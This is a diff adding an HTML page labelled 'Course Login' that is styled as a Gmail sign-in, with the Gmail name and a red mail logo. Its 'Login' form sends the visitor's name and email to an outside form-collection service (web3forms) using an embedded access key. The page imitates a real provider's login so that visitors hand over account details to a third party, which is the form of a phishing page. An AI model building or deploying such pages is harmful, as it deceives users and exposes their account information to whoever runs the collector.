@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Course Login</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background-color: #f2f2f2;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+  }
+  .login-container {
+    background-color: #fff;
+    padding: 40px;
+    border-radius: 8px;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    width: 320px;
+    text-align: center;
+  }
+  .logo {
+    font-size: 48px;
+    color: #d93025; /* Gmail-red-like color */
+  }
+  .title {
+    font-size: 28px;
+    font-weight: bold;
+    margin: 10px 0 30px 0;
+    color: #202124;
+  }
+  .login-container input {
+    width: 100%;
+    padding: 12px;
+    margin: 10px 0;
+    border-radius: 4px;
+    border: 1px solid #ccc;
+    font-size: 16px;
+  }
+  .login-container button {
+    width: 100%;
+    padding: 12px;
+    background-color: #1a73e8;
+    color: white;
+    border: none;
+    border-radius: 4px;
+    font-size: 16px;
+    cursor: pointer;
+    margin-top: 15px;
+  }
+  .login-container button:hover {
+    background-color: #1669c1;
+  }
+</style>
+</head>
+<body>
+
+<div class="login-container">
+  <div class="logo">📧</div>
+  <div class="title">Gmail</div>
+  <form action="https://api.web3forms.com/submit" method="POST">
+    <!-- Web3Forms Access Key -->
+    <input type="hidden" name="access_key" value="12e42846-0d21-47c2-94ac-5f44cd65d355">
+    
+    <!-- Course Info Fields -->
+    <input type="text" name="name" placeholder="" required>
+    <input type="text" name="email" placeholder="" required>
+    
+  
+    
+    <button type="submit">Login</button>
+  </form>
+</div>
+
+</body>
+</html>
